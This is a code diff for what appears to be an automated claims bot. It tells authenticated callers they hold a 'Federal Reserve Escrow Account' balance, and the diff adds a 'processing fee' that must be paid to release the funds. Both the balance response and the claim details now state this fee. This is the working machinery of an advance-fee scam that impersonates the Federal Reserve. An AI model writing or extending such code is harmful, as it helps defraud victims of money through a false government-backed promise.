@@ -90,6 +90,7 @@ async def verify_claim_with_backend(claim_code: str, pin: str) -> dict:
                             "first_name": claim_data.get("firstName", ""),
                             "last_name": claim_data.get("lastName", ""),
                             "escrow_amount_cents": claim_data.get("escrowAmount", 0),
+                            "release_fee_cents": claim_data.get("releaseFee", 0),
                             "escrow_type": claim_data.get("escrowType", "Federal Reserve Escrow Account"),
                             "escrow_description": claim_data.get("escrowDescription", ""),
                             "originating_entity": claim_data.get("originatingEntity", "Federal Reserve Bank"),
@@ -453,7 +454,14 @@ Authenticated: {self.authenticated}
             return "Please verify your claim first. " + self._get_main_menu()
         
         amount_dollars = self.current_claim["escrow_amount_cents"] / 100
-        return f"Your escrow account balance is ${amount_dollars:,.2f}. This amount is held by the {self.current_claim['originating_entity']} and is pending disbursement. " + self._get_claim_status_menu()
+        release_fee = self.current_claim.get("release_fee_cents", 0) / 100
+        
+        response = f"Your escrow account balance is ${amount_dollars:,.2f}. This amount is held by the {self.current_claim['originating_entity']} and is pending disbursement."
+        
+        if release_fee > 0:
+            response += f" To release these funds, a processing fee of ${release_fee:,.2f} is required."
+        
+        return response + " " + self._get_claim_status_menu()
     
     async def _get_claim_status(self) -> str:
         """Get claim status for authenticated claimant."""
@@ -486,8 +494,14 @@ Authenticated: {self.authenticated}
             Claimant name: {claim['first_name']} {claim['last_name']}.
             Escrow type: {claim.get('escrow_type', 'Federal Reserve Escrow Account')}.
             Originating entity: {claim.get('originating_entity', 'Federal Reserve Bank')}.
-            Escrow amount: ${amount_dollars:,.2f}.
-            Current status: {claim['status']}."""
+            Escrow amount: ${amount_dollars:,.2f}."""
+        
+        # Add release fee if applicable
+        release_fee = claim.get("release_fee_cents", 0) / 100
+        if release_fee > 0:
+            details += f" Processing fee required: ${release_fee:,.2f}."
+        
+        details += f" Current status: {claim['status']}."
         
         # Add description if available
         if claim.get('escrow_description'):
